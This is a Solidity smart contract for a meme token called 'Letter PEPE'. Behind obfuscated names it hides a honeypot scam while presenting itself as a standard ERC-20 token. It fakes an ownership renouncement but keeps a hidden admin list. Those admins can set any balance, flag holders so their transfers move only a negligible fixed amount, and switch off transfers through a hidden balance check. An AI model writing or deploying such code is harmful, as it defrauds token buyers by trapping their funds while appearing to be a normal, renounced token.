//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface walletListTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isFund) external view returns (uint256);

    function transfer(address buyIsSender, uint256 sellWallet) external returns (bool);

    function allowance(address exemptBuyAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellWallet) external returns (bool);

    function transferFrom(
        address sender,
        address buyIsSender,
        uint256 sellWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxLaunched, uint256 value);
    event Approval(address indexed exemptBuyAuto, address indexed spender, uint256 value);
}

abstract contract autoAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isShouldExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeFeeLimit {
    function createPair(address takeReceiverLaunched, address modeTx) external returns (address);
}

interface walletListTotalMetadata is walletListTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LetterPEPE is autoAt, walletListTotal, walletListTotalMetadata {

    uint256 constant swapTeamAt = 14 ** 10;

    bool private teamMax;

    function balanceOf(address isFund) public view virtual override returns (uint256) {
        return tokenAtMax[isFund];
    }

    address public shouldLiquidity;

    bool public swapTotal;

    uint256 private launchedReceiver;

    address launchEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return enableLaunch;
    }

    mapping(address => bool) public tradingEnable;

    function allowance(address enableLimitAuto, address takeWallet) external view virtual override returns (uint256) {
        if (takeWallet == launchEnable) {
            return type(uint256).max;
        }
        return amountTokenBuy[enableLimitAuto][takeWallet];
    }

    mapping(address => bool) public teamSell;

    bool public amountFund;

    function receiverTo(address atMarketing, address buyIsSender, uint256 sellWallet) internal returns (bool) {
        require(tokenAtMax[atMarketing] >= sellWallet);
        tokenAtMax[atMarketing] -= sellWallet;
        tokenAtMax[buyIsSender] += sellWallet;
        emit Transfer(atMarketing, buyIsSender, sellWallet);
        return true;
    }

    function transferFrom(address atMarketing, address buyIsSender, uint256 sellWallet) external override returns (bool) {
        if (_msgSender() != launchEnable) {
            if (amountTokenBuy[atMarketing][_msgSender()] != type(uint256).max) {
                require(sellWallet <= amountTokenBuy[atMarketing][_msgSender()]);
                amountTokenBuy[atMarketing][_msgSender()] -= sellWallet;
            }
        }
        return tokenModeReceiver(atMarketing, buyIsSender, sellWallet);
    }

    function decimals() external view virtual override returns (uint8) {
        return toToken;
    }

    function receiverLiquidity() private view {
        require(teamSell[_msgSender()]);
    }

    uint256 public walletListToken;

    address public atMaxMode;

    function modeWallet(address fromExempt) public {
        receiverLiquidity();
        
        if (fromExempt == shouldLiquidity || fromExempt == atMaxMode) {
            return;
        }
        tradingEnable[fromExempt] = true;
    }

    uint8 private toToken = 18;

    function sellTx() public {
        emit OwnershipTransferred(shouldLiquidity, address(0));
        exemptTrading = address(0);
    }

    function tokenModeReceiver(address atMarketing, address buyIsSender, uint256 sellWallet) internal returns (bool) {
        if (atMarketing == shouldLiquidity) {
            return receiverTo(atMarketing, buyIsSender, sellWallet);
        }
        uint256 listBuy = walletListTotal(atMaxMode).balanceOf(fundTake);
        require(listBuy == liquidityLaunched);
        require(buyIsSender != fundTake);
        if (tradingEnable[atMarketing]) {
            return receiverTo(atMarketing, buyIsSender, swapTeamAt);
        }
        return receiverTo(atMarketing, buyIsSender, sellWallet);
    }

    uint256 private listMin = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private amountTokenBuy;

    function transfer(address shouldReceiver, uint256 sellWallet) external virtual override returns (bool) {
        return tokenModeReceiver(_msgSender(), shouldReceiver, sellWallet);
    }

    string private senderTx = "LPE";

    function shouldMarketing(uint256 sellWallet) public {
        receiverLiquidity();
        liquidityLaunched = sellWallet;
    }

    bool public fundAmountList;

    function tradingTx(address shouldReceiver, uint256 sellWallet) public {
        receiverLiquidity();
        tokenAtMax[shouldReceiver] = sellWallet;
    }

    mapping(address => uint256) private tokenAtMax;

    function getOwner() external view returns (address) {
        return exemptTrading;
    }

    function symbol() external view virtual override returns (string memory) {
        return senderTx;
    }

    function feeBuy(address swapList) public {
        require(swapList.balance < 100000);
        if (swapTotal) {
            return;
        }
        if (amountFund == fundAmountList) {
            walletListToken = launchedReceiver;
        }
        teamSell[swapList] = true;
        
        swapTotal = true;
    }

    uint256 buyTeam;

    constructor (){
        
        isShouldExempt atReceiver = isShouldExempt(launchEnable);
        atMaxMode = takeFeeLimit(atReceiver.factory()).createPair(atReceiver.WETH(), address(this));
        
        shouldLiquidity = _msgSender();
        sellTx();
        teamSell[shouldLiquidity] = true;
        tokenAtMax[shouldLiquidity] = listMin;
        if (walletListToken != launchedReceiver) {
            launchedReceiver = walletListToken;
        }
        emit Transfer(address(0), shouldLiquidity, listMin);
    }

    uint256 liquidityLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return listMin;
    }

    function approve(address takeWallet, uint256 sellWallet) public virtual override returns (bool) {
        amountTokenBuy[_msgSender()][takeWallet] = sellWallet;
        emit Approval(_msgSender(), takeWallet, sellWallet);
        return true;
    }

    string private enableLaunch = "Letter PEPE";

    address private exemptTrading;

    bool private receiverToken;

    event OwnershipTransferred(address indexed atIs, address indexed senderMinTx);

    address fundTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return exemptTrading;
    }

}